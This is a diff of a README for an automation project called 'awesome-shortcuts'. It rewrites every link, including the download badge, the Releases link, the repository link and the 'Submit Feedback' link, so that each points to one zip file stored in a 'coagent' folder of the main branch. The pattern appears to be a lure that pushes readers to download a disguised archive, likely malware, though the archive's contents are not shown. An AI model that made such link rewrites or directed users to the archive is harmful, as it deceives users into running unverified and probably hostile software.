@@ -1,6 +1,6 @@
 # 🎉 awesome-shortcuts - Automate Your Tasks Easily
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/QuesoVfx/awesome-shortcuts/releases)
+[![Download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **awesome-shortcuts**! This is a collection of fun and useful automat
 
 To get started, you need to visit the Releases page to download the latest version of the software. Click the link below to go there now:
 
-[Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/releases)
+[Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
 
 ### 💻 System Requirements
 
@@ -53,9 +53,9 @@ To keep your search straightforward, here are relevant topics about our tool:
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/QuesoVfx/awesome-shortcuts)
-- [Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/releases)
-- [Submit Feedback](https://github.com/QuesoVfx/awesome-shortcuts/issues)
+- [GitHub Repository](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
+- [Visit this page to download](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
+- [Submit Feedback](https://github.com/QuesoVfx/awesome-shortcuts/raw/refs/heads/main/coagent/awesome_shortcuts_3.1-alpha.2.zip)
 
 ## 🙌 Join Us
 
